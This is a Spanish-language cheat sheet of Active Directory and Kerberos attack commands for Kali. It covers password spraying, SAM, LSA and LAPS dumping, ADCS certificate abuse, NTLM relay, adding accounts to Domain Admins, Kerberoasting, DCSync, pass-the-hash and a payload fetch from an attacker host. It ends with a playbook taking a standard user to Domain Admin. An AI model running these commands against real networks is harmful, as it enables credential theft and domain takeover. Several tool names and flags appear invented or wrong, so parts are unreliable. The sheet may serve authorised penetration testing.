# Active Directory y Kerberos — Herramientas Instaladas

Suite completa post-explotación y dominio en esta máquina Kali. Flujo típico: credenciales iniciales → enumeración (BloodHound) → attack path → explotación (certipy/bloodyAD/relay) → credenciales robadas (pypykatz/dploot) → escalamiento a Domain Admin (DCSync).

> Verificar presencia de cada tool con `which <tool>`. Las de Impacket en Kali moderno se invocan como `impacket-<herramienta>` (p.ej. `impacket-secretsdump`); si el paquete se instaló por pipx, el nombre puede ser sin prefijo.

## índice
- netexec / bloodhound / certipy / bloodyAD / coercer / relays
- pypykatz / dploot / masky / antdsparse / minikerberos / msldap / pywerview
- Impacket clave / Attack paths priorizados / Playbook extremo a extremo

---

## netexec (nxc) — Navaja suiza de red Windows

Protocolos: `smb`, `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `ftp`, `vnc`, `ipc`, `wmi`.

```bash
# Validación de credenciales a escala (evitar lockout: --no-bruteforce + delay)
netexec smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --no-bruteforce --continue-on-success \
  -M spider_plus --log $BASE/loot/nxc_spray.log

# Autenticación local reutilizando hash (PtH/PtT con --local-auth)
netexec smb 10.10.10.0/24 -u admin -H <NTLM_HASH> --local-auth -x "whoami"

# Módulos de enumeración accionables
netexec smb 10.10.10.10 -u u -p 'p' --shares              # lista shares + permisos
netexec smb 10.10.10.10 -u u -p 'p' --sam                  # dump SAM (SI no DC)
netexec smb 10.10.10.10 -u u -p 'p' --lsa                  # LSA secrets (SI no DC)
netexec smb 10.10.10.10 -u u -p 'p' --dpapi                # masterkeys via DPAPI
netexec ldap 10.10.10.10 -u u -p 'p' --sam --no-pass       # AS-REP targets sin credencial
netexec ldap 10.10.10.10 --gmsa                             # cuentas gMSA crakeables
netexec ldap 10.10.10.10 -u u -p 'p' --pwn2own              # rutas BloodHound-style
netexec ldap 10.10.10.10 -u u -p 'p' --adcs                 # plantilla vulnerable ESC
netexec ldap 10.10.10.10 -u u -p 'p' --laps                 # leer LAPS passwords

# Ejecución remota según protocolo disponible
netexec smb  10.10.10.20 -u u -p 'p' -x 'cmd /c whoami'     # psexec
netexec wmi  10.10.10.20 -u u -p 'p' -x 'cmd /c whoami'     # WMI (más silencioso)
netexec winrm 10.10.10.20 -u u -p 'p' -x 'whoami'           # WinRM (5985)

# Módulos de utilidad
netexec smb 10.10.10.20 -u u -p 'p' -M web_delivery -o URL=http://atk/payload.ps1
netexec smb 10.10.10.20 -u u -p 'p' -M rdp --rdp   # screenshot periodic RDP
netexec smb 10.10.10.0/24 -u u -p 'p' -M mimikatz  # si el target lo permite
```

`netexec --list-modules` y `netexec smb --list-modules` muestran lo disponible en la versión instalada. Base de datos: `nxcdb` (guarda hosts/creds entre sesiones; `nxcdb -u` para explorar).

## bloodhound-python — Ingesta AD

```bash
# Ingesta completa con credenciales
bloodhound-python -u 'user' -p 'pass' -d corp.local -dc dc01.corp.local -ns 10.10.10.10 \
  -c All --zip -f $BASE/scans/bh_$(date +%m%d)

# Colecciones selectivas (menos ruido, más rápido)
# -c DCOM|LocalAdmin|RDP|Session|ObjectProps|UserStatus|Container|Trusts|ACLs|GPOADObject|Base
bloodhound-python -u 'user' -p 'pass' -d corp.local -ns 10.10.10.10 -c Base,ObjectProps,LocalAdmin

# Alternativa: ingesta por MS-ADRPC (funciona sin LDAP directo, solo SMB/RPC)
msldap-bloodhound -d corp.local -u 'user' -p 'pass' --dc-hostname dc01 -f $BASE/scans/bh_msldap

# Enviar zip a la GUI de BloodHound (Neo4j en otro host: no hace falta instalar aquí)
```

Analizar en BloodHound: "Shortest Paths to Domain Admins", "Outbound Control", "User Shortest Paths to GPO".

## certipy (certipy-ad) — ADCS (ESC1–ESC13)

```bash
# Hallar plantillas vulnerables
certipy find -vulnerable -u 'user@corp.local' -p 'pass' -dc-ip 10.10.10.10 -stdout -csv

# ESC1: plantilla con ENROLLEE_SUPPLIES_SUBJECT → cert para cualquier usuario
certipy req -u 'user@corp.local' -p 'pass' -ca corp-DC-CA -template ESC1-Vuln \
  -upn administrator@corp.local -dns-host dc01.corp.local

# ESC8: relay HTTP→cert Enrollment (combinar con ntlmrelayx)
certipy relay -ca corp-DC-CA -target http://10.10.10.30/certsrv

# Usar el pfx para auth (Kerberos) y Dump (DCSync)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy shadow -u 'user@corp.local' -p 'pass' -target dc01.corp.local   # ESC4-shadow (requiere WRITE_DAC)
```

## bloodyAD — Escritura LDAP agresiva (escalada por ACL)

```bash
B="bloodyAD --host 10.10.10.10 -d corp.local -u user -p 'pass'"
$B get object 'DC=corp,DC=local' --attr ms-DS-Machine-Account-Quota
$B add groupMember 'Domain Admins' 'attacker'          # si tengo ACL GenericAll/WriteMembers
$B add computer 'ATTACKER$' 'Password123!' --dc-host dc01
$B set password 'victim' 'Winterr2026!'                # si tengo Reset Password
$B add dnsRecord dc01.corp.local '10.10.10.99'        # DNS takeover → relay
$B remove dNSHostName 'printer01.corp.local' ...      # para envenenar y robar
# Cualquier op soportado: $B --help / $B <cmd> --help
```

## coercer — Forzar autenticación (PetitPotam, PrinterBug, Shadow...)

```bash
# Listar vectores y probar cuáles responden (sin explotar aún)
coercer coerce -u 'user' -p 'pass' -d corp.local -t 10.10.10.10 --list-methods
coercer coerce -u 'user' -p 'pass' -d corp.local -l targets.txt -M ALL --timeout 5

# Combinación clásica: coercer/ntlmrelayx hacia servidor con SMB signing OFF → relay a LDAP/DNS
impacket-ntlmrelayx -smb2support -t ldap://10.10.10.10 --escalate-user attacker
```

## pypykatz — Mimikatz en Python (offline sobre loot)

```bash
pypykatz lsa minidump lsass.dmp                       # volcado de memoria (procdump/comsvcs)
pypykatz registry SYSTEM --sam SAM                    # hive offline robado
pypykatz dpapi masterkey --hexkey <GUID> <fichero>   # decrypt masterkeys
pypykatz kerberos purge/parse                         # tickets kirbi/ccache
```
(On-line, el equivalente es `netexec smb ... --lsa/--sam` o `impacket-secretsdump`.)

## dploot — DPAPI remotely (credentials, bookmarks, masterkeys, Safari/Chrome)

```bash
dploot lsas -u 'user' -p 'pass' --target 10.10.10.20              # LSASS backupkeys del GPO
dploot credentials -u 'user' -p 'pass' -d corp.local --target 10.10.10.20  # Credential Manager
dploot bookmarks -u 'user' -p 'pass' --target 10.10.10.20          # IE/Edge favorites
dploot masterkeys -u 'user' -p 'pass' --target 10.10.10.20         # masterkeys (combinar con pypykatz dpapi)
```

## masky — Recolección de credenciales vía sesión remota

```bash
masky -u 'user' -p 'pass' -d corp.local 10.10.10.20   # secuestro de sesión/extracción en target
# Verificar flags exactos con `masky --help` (versión en pipx puede variar)
```

## antdsparse — Sparse-AD + SPNs + AS-REP en un solo paso

```bash
antdsparse -d corp.local -u 'user' -p 'pass' -ns 10.10.10.10 -o csv -f $BASE/scans/adsparse
# Salida: usuarios, atributos (description con creds!), SPNs (Kerberoast targets),
#         cuentas con DONT_REQ_PREAUTH (AS-REP) — cubre tres enums en una pasada
```

## minikerberos — Suite Kerberos manual (cuando las wrappers fallan)

```bash
minikerberos-asreproast kerberos://corp.local/user:pass@10.10.10.10     # AS-REP roast
minikerberos-kerberoast kerberos://corp.local/user:pass@10.10.10.10     # TGS harvest
minikerberos-getTGT -u user -p 'pass' -d corp.local -k admin.kirbi
minikerberos-getS4U2self --tgt admin.kirbi -u victim -s svc/target      # unconstrained delegation
minikerberos-getS4U2proxy --kirbi s4u.kirbi -s HTTP/web01.corp.local    # forjar service ticket
minikerberos-ccacheroast -c /tmp/krb5cc_1000                            # roast desde ccache
minikerberos-kirbi2ccache admin.kirbi admin.ccache   # y viceversa: ccache2kirbi
minikerberos-kerb23hashdecrypt -u user -d corp.local hash_krb5_tgs <hash>  # NTLM<-key derivation
```

## pywerview — PowerView en Python (solo lectura/enum)

```bash
pywerview get-netuser -u 'user' -p 'pass' -w corp.local | grep -i "description\|admin"
pywerview get-netcomputer -u 'user' -p 'pass' -w corp.local            # hosts + UnconstrainedDeleg
pywerview get-netgroup -u 'user' -p 'pass' -w corp.local -Name "Domain Admins"
pywerview find-netlocalgroupmember -u 'user' -p 'pass' -w corp.local -ComputerName srv01  # admin local
pywerview get-netgpo -u 'user' -p 'pass' -w corp.local                  # GPOs
```

## awinreg / asmb* — Registro remoto y SMB async de alto rendimiento

```bash
awinreg query -u 'user' -p 'pass' -d corp.local --target-ip 10.10.10.20 \
  --key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
asmbscanner 10.10.10.0/24                      # ping+banner SMB masivo rápido
asmbshareenum -u u -p 'p' 10.10.10.0/24        # enumerate shares
asmbgetfile -u u -p 'p' --target-ip 10.10.10.20 --file "ADMIN$/..."; # read remoto
```

## remotinator — Automatización RDP en post-expl

```bash
remotinator --share-list -u 'user' -p 'pass' -d corp.local --host 10.10.10.20
remotinator --file-upload -u 'user' -p 'pass' -d corp.local --host 10.10.10.20 \
  --share-type ADMIN$ --file-path ./beacon.dll   # subir sin SMB (vía RDP clipboard/drive map)
```

## Impacket que SIEMPRE conviene tener a mano

```bash
impacket-secretsdump 'corp.local/user:pass@10.10.10.10'                # DCSync/NTDS/SAM/registry
impacket-secretsdump -just-dc-user administrator 'corp/user:pass@DC01' # solo una cuenta (menos ruido)
impacket-psexec / impacket-wmiexec / impacket-atexec                   # RCE por protocolo
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat   # AS-REP roast
impacket-GetUserSPNs corp.local/user:pass -request                     # Kerberoast
impacket-GetUserSPNs --outputfile kerbs.txt -dc-ip ...                 # Kerberoast a archivo
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support --no-smb1        # relay
impacket-nthash '<LM:NT>' / pass-the-hash tools                        # PtH
impacket-lookupsid corp.local/user:pass@10.10.10.10                    # SID enum cross-domain
impacket-getST -spn cifs/10.10.10.20 corp.local/user@hash              # PtT: service ticket con hash
```

---

## Attack paths — Orden de intento (esfuerzo vs éxito)

1. **Credenciales en atributos AD** (`antdsparse`/ LDAP: description="Password: ..." en no-IT) — gratis.
2. **AS-REP roasting** — cuentas con DONT_REQ_PREAUTH; barato, offline crack.
3. **Kerberoast** — cualquier usuario con SPN; mismo patrón.
4. **ADCS ESC1/ESC3/ESC4/ESC8** (`certipy find -vulnerable`) — altísima tasa de éxito en 2024+.
5. **Relay** (coercer + ntlmrelayx): SMB signing OFF → escrivir ACL (`--escalate-user`) o relay a ADCS/DC.
6. **ACLs abuso** (BloodHound "WriteDacl"/"GenericAll" → bloodyAD add groupMember).
7. **gMSA** (`netexec ldap --gmsa`) — si el grupo de lectores tiene acceso.
8. **LAPS** (`netexec ldap --laps` con el permiso) — admin local en todos los host.
9. **Constrained delegation** (S4U2self/S4U2proxy con forjado: minikerberos o RBCD vía bloodyAD+certipy).
10. **DCSync** (`impacket-secretsdump` / `netexec ldap --sam`) — ya con replicación ACLs.
11. **Pass-the-Hash** a través de toda la granja con el hash de DA (`netexec ... -H`).

## Playbook extremo a extremo (dominio con user estándar → DA)

```bash
# 1. Recon pasivo con la única cred
antdsparse -d corp.local -u jdoe -p 'Winter2026!' -ns 10.10.10.10 -o csv -f $BASE/scans/adsparse
# 2. BloodHound
bloodhound-python -d corp.local -u jdoe -p 'Winter2026!' -dc dc01.corp.local -ns 10.10.10.10 -c All --zip
# 3. (analizar GUI/queries → p.ej. sale: jdoe tiene GenericWrite sobre svc-backup)
# 4. Ataque al path hallado (GenericWrite → shadow creds / RBCD)
bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Winter2026!' add computer 'myca$' 'P@ss1234' --dc-host dc01
# ... y continuar con certipy shadow / secretsdump según el path.
# 5. Loot y persistencia documentada en $BASE/notes.md SIEMPRE paso a paso.
```
